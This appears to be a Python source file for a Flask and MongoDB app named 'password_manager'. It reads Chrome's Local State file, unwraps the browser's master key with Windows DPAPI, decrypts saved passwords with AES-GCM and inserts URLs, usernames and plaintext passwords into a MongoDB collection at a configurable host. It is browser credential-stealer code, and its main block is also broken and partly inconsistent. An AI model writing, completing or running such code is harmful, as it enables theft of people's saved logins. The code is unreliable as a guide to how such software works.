import os
import win32crypt
import re
import sys
import json
import base64
from flask import Flask
from dotenv import load_dotenv
from Cryptodome.Cipher import AES
import pymongo

app = Flask(__name__)

# Load environment variables from .env
load_dotenv()

# MongoDB Connection
MONGO_URI = os.getenv("DATABASE_URI")  # Get MongoDB URI from .env
client = pymongo.MongoClient(MONGO_URI)
db = client["password_manager"]  # Database name
collection = db["decrypted_passwords"]  # Collection name

@app.route('/')
def home():
    return "Flask with MongoDB is running!"

def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""

def process_file(file_path):
    """Reads a JSON file and extracts login data"""
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            data = json.load(file)
            
            # Example JSON structure: [{ "url": "...", "username": "...", "password": "..." }]
            for index, entry in enumerate(data):
                url = entry.get("url")
                username = entry.get("username")
                password = entry.get("password")  # Assume it's already decrypted
                
                if url and username and password:
                    # Insert into MongoDB
                    collection.insert_one({
                        "index": index,
                        "url": url,
                        "username": username,
                        "password": password
                    })
                    print(f"Saved to MongoDB: {url}, {username}, {password}")

    except Exception as e:
        print(f"[ERROR] Failed to process {file_path}: {str(e)}")

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

if __name__ == '__main__':
    app.run(debug=True)
    try:
        # Get secret key
        secret_key = get_secret_key()

        # Find Chrome's profile folders
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]

        # Loop through each profile folder
        for folder in folders:
            if os.path.exists(folder):
                for filename in os.listdir(folder):
                    if filename.endswith(".json"):  # Only process JSON files
                        file_path = os.path.join(folder, filename)
                        process_file(file_path)
            else:
                print(f"[ERROR] Folder path {folder} does not exist!")
    except Exception as e:
        print("[ERR] %s"%str(e))
